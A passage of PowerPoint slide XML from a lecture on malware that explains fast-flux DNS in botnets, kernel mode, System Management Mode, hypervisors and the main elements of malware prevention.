                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>used to hide the servers is fast-flux DNS, where the address associated with a given</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>server name is changed frequently, often every few minutes, to rotate over a large</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>number of server proxies, usually other members of the botnet. Such approaches</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>hinder attempts by law enforcement agencies to respond to the botnet threat.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1200" i="0" kern="1200">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>68</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="119777212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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>70</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="113700113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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>71</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="232799148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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The kernel is the portion of the OS that includes the most heavily used and most critical portions of</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>software. Kernel mode is a privileged mode of execution reserved for the kernel. Typically, kernel mode</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>allows access to regions of main memory that are unavailable to processes executing in a less privileged</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>mode and also enables execution of certain machine instructions that are restricted to the kernel mode.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" i="0" kern="1200">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The System Management Mode (SMM) is a relatively obscure mode on Intel processors used for</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>low-level hardware control, with its own private memory space and execution environment, that is generally invisible to code running outside (e.g., in the operating system).</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>72</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3725873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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The kernel is the portion of the OS that includes the most heavily used and most critical portions of</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>software. Kernel mode is a privileged mode of execution reserved for the kernel. Typically, kernel mode</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>allows access to regions of main memory that are unavailable to processes executing in a less privileged</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>mode and also enables execution of certain machine instructions that are restricted to the kernel mode.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>73</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="267052463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A hypervisor or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>virtual machine monitor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> (VMM) is computer software, firmware or hardware that creates and runs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>virtual machines</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>. A computer on which a hypervisor runs one or more </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>virtual machines</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> is called a host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>machine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>, and each </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>virtual machine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> is called a guest </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>machine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Such code has direct access to attached hardware devices, and</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>is generally invisible to code running outside these special modes </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>74</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34211251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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>prevention: Do not allow malware to get into the system in the first place, or block the ability of it to modify the system.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>there</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>are four main elements of prevention: policy, awareness, vulnerability mitigation,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>and threat mitigation.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>75</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="147526874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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>prevention: Do not allow malware to get into the system in the first place, or block the ability of it to modify the system.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>there</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>are four main elements of prevention: policy, awareness, vulnerability mitigation,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>and threat mitigation.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
